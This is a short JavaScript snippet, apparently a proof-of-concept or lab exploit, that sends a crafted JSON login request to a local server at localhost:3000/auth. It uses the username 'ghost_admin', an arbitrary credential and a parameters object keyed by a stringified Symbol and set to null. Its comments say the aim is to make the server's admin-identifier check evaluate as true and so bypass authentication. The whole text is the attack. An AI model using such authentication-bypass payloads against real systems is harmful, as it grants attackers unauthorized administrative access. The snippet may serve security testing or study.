// The JSON payload for the request
const payload = {
  username: "ghost_admin",
  credential: "anything",
  // We need to craft this in a way that the server will reconstruct
  // an object with the Symbol property
  parameters: {
    // We can't directly serialize the Symbol, but we can
    // create an object that will cause the server to evaluate
    // options[ADMIN_ID] == null condition to true
    [Symbol.for("adminIdentifier").toString()]: null,
  },
};

// Make authentication request with proper JSON content type
const res = await fetch("http://localhost:3000/auth", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(payload),
});

console.log(await res.json());
